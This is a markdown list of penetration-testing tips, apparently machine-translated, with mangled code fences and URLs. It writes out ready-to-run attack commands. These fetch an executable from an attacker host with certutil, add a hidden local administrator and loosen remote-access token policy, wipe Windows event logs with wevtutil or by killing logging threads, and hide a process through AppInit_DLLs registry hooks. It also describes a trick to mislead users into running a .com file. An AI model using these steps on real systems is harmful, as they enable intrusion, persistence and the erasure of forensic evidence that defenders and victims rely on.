# Pentest-and-Development-Tips
A collection of pentest and development tips

Author: 3gstudent

### statement

The following tips should not be used for illegal purposes

---

### Tips 1. Manual port detection

The -sV nmap can detect the service version, but in some cases you must manually probe to verify

Use Wireshark response package is overkill, nc simple judgment

eg

For port 8001, nc connected up, just enter a string, get the following result:

`` `
$ nc -vv localhost 8001
localhost [127.0.0.1] 8001 (?) open
asd
HTTP / 1.1 400 Bad Request
Date: Fri, 25 Aug 2017 12:15:25 GMT
Server: Apache / 2.4.23 (Debian)
Content-Length: 301
Connection: close
Content-Type: text / html; charset = iso-8859-1
<! DOCTYPE HTML PUBLIC "- // IETF // DTD HTML 2.0 // EN">
<html> <head>
<title> 400 Bad Request </ title>
</ head> <body>
<h1> Bad Request </ h1>
<p> Your browser sent a request that this server could not understand. <br />
</ p>
<hr>
<address> Apache / 2.4.23 (Debian) Server at 127.0.0.1 Port 8001 </ address>
</ body> </ html>
`` `

From this we know that this is an http service because the string we sent was not a valid HTTP request, so we returned a 400 Bad requests, and we also got the system version of Debian, WebServer is Apache

Reference:

["Talk about port exploration experience and principles"] (http://www.freebuf.com/articles/network/146087.html)


---

### Tips 2. Windows system to download files from Kali

Kali:

`` `
python -m SimpleHTTPServer 80
`` `

Windows:

`` `
certutil.exe -urlcache -split -f http://192.168.1.192/Client.exe 1.exe
certutil.exe -urlcache -split -f http://192.168.1.192/Client.exe delete
`` `
Reference:

["Certutil.exe in penetration test"] (https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF % 95% E4% B8% AD% E7% 9A% 84certutil.exe /)

---

### Tips 3. Configure the workgroup computer to support net use remote connections

Add user:

`` `
net user test test / add
net localgroup administrators test / add
`` `

Modify the registry to support remote connections:

`` `
reg add hklm \ SOFTWARE \ Microsoft \ Windows \ CurrentVersion \ Policies \ System / v LocalAccountTokenFilterPolicy / t REG_DWORD / d 1
`` `

net use remote connection:

`` `
net use \\ 192.168.1.195 test / u: test
`` `

---

### Tips 4. Windows log clear

Get log classification list:

`` `
wevtutil el> 1.txt
`` `

Get statistics for a single log category:

eg

`` `
wevtutil gli "windows powershell"
`` `

echo:

`` `
creationTime: 2016-11-28T06: 01: 37.986Z
lastAccessTime: 2016-11-28T06: 01: 37.986Z
lastWriteTime: 2017-08-08T08: 01: 20.979Z
fileSize: 1118208
attributes: 32
numberOfLogRecords: 1228
oldestRecordNumber: 1
`` `

View the specific content of the specified log:

`` `
wevtutil qe / f: text "windows powershell"
`` `

Delete all information for a single log category:

`` `
wevtutil cl "windows powershell"
`` `

Reference:

["Penetration Tips - Remove and Bypass Windows Logs"] (https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80% E5% B7% A7-Windows% E6% 97% A5% E5% BF% 97% E7% 9A% 84% E5% 88% A0% E9% 99% A4% E4% B8% 8E% E7% BB% 95% E8% BF% 87 /)

---

### Tips 5. Destroy Windows log records

By calling TerminateThread to achieve the log function of the thread, making the logging failure, but the Windows Event Log service is not damaged, the state is still running

Powershell:

https://github.com/hlldz/Invoke-Phant0m

C ++:

https://github.com/3gstudent/Windwos-EventLog-Bypass

Reference:

["Penetration Tips - Remove and Bypass Windows Logs"] (https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80% E5% B7% A7-Windows% E6% 97% A5% E5% BF% 97% E7% 9A% 84% E5% 88% A0% E9% 99% A4% E4% B8% 8E% E7% BB% 95% E8% BF% 87 /)

["Bypassing Windwos Log Monitoring with API-NtQueryInformationThread and I_QueryTagInformation"] (https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8API-NtQueryInformationThread% E5% 92% 8CI_QueryTagInformation% E5% AE% 9E% E7% 8E% B0% E5% AF% B9Windwos% E6% 97% A5% E5% BF% 97% E7% 9B% 91% E6% 8E% A7% E7% 9A% 84% E7% BB% 95% E8% BF% 87 /)


---

### Tips 6. The processes under Win7 and Windows Server 2008 R2 are hidden

Use globalAPIhooks, by modifying the registry

Download Project: https://github.com/subTee/AppInitGlobalHooks-Mimikatz

Modify the code to specify the hidden program name cldr.exe, compiled into cldr.dll, cldr.dll on `C: \ ProgramData \ Microsoft \ HelpLibrary \`

Administrator rights:

`` `
reg add "hklm \ SOFTWARE \ Microsoft \ Windows NT \ CurrentVersion \ Windows" / v RequireSignedAppInit_DLLs / t REG_DWORD / d 0
reg add "hklm \ SOFTWARE \ Microsoft \ Windows NT \ CurrentVersion \ Windows" / v LoadAppInit_DLLs / t REG_DWORD / d 1 / f
reg add "hklm \ SOFTWARE \ Microsoft \ Windows NT \ CurrentVersion \ Windows" / v AppInit_DLLs / t REG_SZ / d "C: \\ ProgramData \\ Microsoft \\ HelpLibrary \\ cldr.dll" / f
`` `

At this point, cldr.exe does not exist in the Task Manager process list, cldr.exe does not exist in Process Explorer, and cldr.exe does not exist in Tasklist.exe

For 64-bit systems:

Administrator rights:

`` `
reg add "hklm \ SOFTWARE \ Microsoft \ Windows NT \ CurrentVersion \ Windows" / v RequireSignedAppInit_DLLs / t REG_DWORD / d 0
reg add "hklm \ SOFTWARE \ Microsoft \ Windows NT \ CurrentVersion \ Windows" / v LoadAppInit_DLLs / t REG_DWORD / d 1 / f
reg add "hklm \ SOFTWARE \ Microsoft \ Windows NT \ CurrentVersion \ Windows" / v AppInit_DLLs / t REG_SZ / d "C: \\ ProgramData \\ Microsoft \\ HelpLibrary \\ cldrx64.dll" / f
reg add "hklm \ SOFTWARE \ Microsoft \ Windows NT \ CurrentVersion \ Windows" / v RequireSignedAppInit_DLLs / t REG_DWORD / d 0
reg add "hklm \ SOFTWARE \ Microsoft \ Windows NT \ CurrentVersion \ Windows" / v LoadAppInit_DLLs / t REG_DWORD / d 1 / f
reg add "hklm \ SOFTWARE \ Wow6432Node \ Microsoft \ Windows NT \ CurrentVersion \ Windows" / v AppInit_DLLs / t REG_SZ / d "C: \\ ProgramData \\ Microsoft \\ HelpLibrary \\ cldr.dll" / f
`` `

Reference:

["Using globalAPIhooks to hide processes under Win7"] (https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8globalAPIhooks%E5%9C%A8Win7%E7% B3% BB% E7% BB% 9F% E4% B8% 8B% E9% 9A% 90% E8% 97% 8F% E8% BF% 9B% E7% A8% 8B /)

---

### Tips 7. exe and com file of the same name the order of execution

If a path contains both exe and com files of the same name, for example, test.exe and test.com, enter test (without the file extension) via the command line cmd, giving priority to the com file, test.com

The COM file generated only need to exe file extension to com can be

Reference:

"A dirty way of tricking users to bypass UAC"

---
